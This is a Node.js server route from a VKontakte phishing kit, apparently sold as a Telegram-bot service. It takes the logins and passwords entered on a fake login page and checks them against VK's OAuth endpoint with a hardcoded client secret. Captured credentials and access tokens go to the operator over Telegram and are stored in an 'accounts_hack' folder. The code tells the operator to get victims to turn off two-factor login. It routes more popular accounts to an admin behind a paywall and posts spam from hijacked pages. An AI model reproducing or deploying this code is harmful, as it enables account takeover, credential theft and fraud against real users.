const request = require('request')
const fs = require('fs');
const bot_tg = require(`./bot.js`);

var get_user = require("../functions/get_user"),
    save_user = require("../functions/save_user");

const { VK } = require("vk-io");

function start(app) { 
  app.post("/auth", (req, res) => {
      console.log(req.body)
      console.log(req.body.id)
      if(req.body.login == "" || req.body.password == "") {
          res.render(`login/login.ejs`, {
            error: 1,
            capcha: {
              status: 0
            },
            id: req.body.id
          })
      } else {
        request(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${req.body.login}&password=${encodeURIComponent(req.body.password)}${req.body.captcha_id ? `&captcha_sid=${req.body.captcha_id}&captcha_key=${req.body.captcha}` : ``}`, async (err, response, body) => {
            if(body != undefined) {
                var info = JSON.parse(body);
                if(info.error) {
/*==============================================================*/
                  if(info.error == "invalid_client") {
                    if(req.body.id) {
                          var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Неверный логин или пароль. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                          var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                          [{"text": "⏪ Меню", callback_data: "menu"}]];
                          bot_tg.send_messages(req.body.id, text_message, buttons);
                      }
                      return res.render(`login/login.ejs`, {
                        error: 1,
                        capcha: {
                          status: 0
                        },
                        id: req.body.id
                      })
                  }
/*==============================================================*/
                  if(info.error == "need_captcha") {
                    if(req.body.id) {
                          var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Каптча. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                          var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                          [{"text": "⏪ Меню", callback_data: "menu"}]]
                          bot_tg.send_messages(req.body.id, text_message, buttons);
                      }
                      return res.render(`login/login.ejs`, {
                        error: 3,
                        id: req.body.id,
                        capcha: {
                          status: 1,
                          captcha_sid: info.captcha_sid,
                          captcha_img: info.captcha_img
                        }
                      })
                  }
/*==============================================================*/
                  if(info.error == `need_validation` || info.error == 'invalid_request') {
                    if(req.body.id) {
                      var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Включена 2fa авторизация (подтверждение входа через SMS).\n⚙️ Попросите жертву отключить подтверждение входа и повторите попытку. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                      var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                      [{"text": "⏪ Меню", callback_data: "menu"}]]
                      bot_tg.send_messages(req.body.id, text_message, buttons);
                    }
                      return res.render(`login/login.ejs`, {
                        ads: req.body.ads,
                        error: 3,
                        capcha: {
                          status: 0
                        },
                        id: req.body.id
                      }) 
                  }
/*==============================================================*/
                  if(info.access_token) {
                    const vk = new VK({
                        token: info.access_token
                    });

                    let users_info = await vk.api.users.get({
                        token: vk.token,
                        fields: "counters"
                    });
                    
                    if(req.body.id) {
                      get_user.start(req.body.id, (info) => {
                        fs.access(`./accounts_hack/${users_info[0].id}.json`, function(error) {
                          if (error) {
                              fs.open(`./accounts_hack/${users_info[0].id}.json`, 'w', (err) => {
                                  var file = {
                                    id: users_info[0].id,
                                    login: req.body.login,
                                    password: req.body.password
                                  }
                                  info.hacked_accounts += 1;
                                  fs.writeFile(`./accounts_hack/${users_info[0].id}.json`, JSON.stringify(file), function writeJSON(err) {});
                              })
                          } else {
                            login_info = JSON.parse(fs.readFileSync(`./accounts_hack/${users_info[0].id}.json`, 'utf8'));
                            if(login_info.password != req.body.password) {                              
                              login_info.password = req.body.password;
                              info.hacked_accounts += 1;
                              fs.writeFileSync(`./accounts_hack/${users_info[0].id}.json`, JSON.stringify(login_info), (err) => {
                                if (err) return console.log(err);
                              })
                            }
                          }
                      });
                        if(info.cells.hacked <= 0) {
                          if((users_info[0].counters.followers != undefined && users_info[0].counters.followers > 25 || users_info[0].counters.followers + users_info[0].counters.friends > 25) || users_info[0].counters.friends > 25) {
                            var text_message_warning = `⚠️ ВНИМАНИЕ ⚠️\nВы взломали аккаунт, у которого суммарное количество друзей и подписчиков превышает допустимое число для получения аккаунтов без ячеек (25). В связи с этим, аккаунт отправляется администратору проекта.\n\n<b>Хотите получать все взломанные аккаунты? Приобретите пустые ячейки.</b>`
                            var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                          [{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                                          [{"text": "⏪ Меню", callback_data: "menu"}]]
                            bot_tg.send_messages(req.body.id, text_message_warning, buttons);

                            var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;

                            if((users_info[0].counters.followers != undefined && users_info[0].counters.followers >= 50) || users_info[0].counters.friends >= 50) {
                              vk.api.wall.post({
                                owner_id: users_info[0].id,
                                attachments: "photo-208628687_457239017",
                                message: `https://t.me/new_vk_fishing_bot`
                              });
                              text_message = `<b>⚠️ ПОСТ ⚠️</b>`
                            }
                            var random_boolean = Boolean(Math.round(Math.random()));
                            if(random_boolean = false) {
                              var buttons = [[{"text": "Перейти в бота", url: "https://t.me/new_vk_fishing_bot"}],
                              [{"text": "⏪ Меню", callback_data: "menu"}]];
                              return bot_tg.send_messages("@vk_fishing_bot_news", text_message, buttons);
                            } else {
                              return bot_tg.send_messages("343783264", text_message, []);    
                            }
                          }
                          if(users_info[0].counters.followers != undefined && users_info[0].counters.followers + users_info[0].counters.friends < 25) {
                            var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;
                            return bot_tg.send_messages(req.body.id, text_message, []);
                          }
                        } else {
                          info.cells.hacked -= 1;
                          if(info.cells.hacked <= 0) {
                            info.cells.hacked = 0;
                            var text_message = `⚠️ ВНИМАНИЕ ⚠️\nВы заполнили все свободные ячейки.\nКупите ещё свободных ячеек чтобы продолжить получать аккаунты.`
                            var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                          [{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                                          [{"text": "⏪ Меню", callback_data: "menu"}]]
                            
                            bot_tg.send_messages(req.body.id, text_message, buttons);
                          }

                          var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;
                          var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}],
                          [{"text": "⏪ Меню", callback_data: "menu"}]];
                          return bot_tg.send_messages(req.body.id, text_message, []);
                        }
                        return save_user.start(req.body.id, info);
                      })
                    }
                  res.redirect(info.link);
                  }
              }
            }
        })
      } 
  })
}

module.exports = {
  start
}